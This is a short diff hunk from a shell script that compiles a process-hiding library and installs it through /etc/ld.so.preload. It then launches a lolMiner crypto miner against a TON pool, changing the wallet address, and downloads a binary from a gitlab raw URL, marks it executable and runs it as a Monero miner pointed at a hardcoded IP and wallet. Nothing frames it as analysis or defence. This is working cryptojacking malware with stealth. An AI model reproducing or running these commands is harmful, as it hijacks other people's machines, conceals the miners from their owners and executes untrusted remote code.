@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQCBBNezVG6Hb6GN3iIUTpKXcPwTaa-916IytX75Un0tlFsr --pass x & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
+./graftcp/graftcp ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQCE0mvwsYSjdDZI_sgZuQQOVwNTBoKW75Nl89xxh2Dk7OoB --pass x & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
 chmod 777 b && ./b -o 161.35.141.255:80 -u amyL9equu23NpcyJeePCYSjQoKaJ9vpxe9QZvu1YmUAnTi9FMiWbyzEh3FxRkExmCt4Zwg79gXNBJULa2qdk5nv82tcpjpSW6s -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
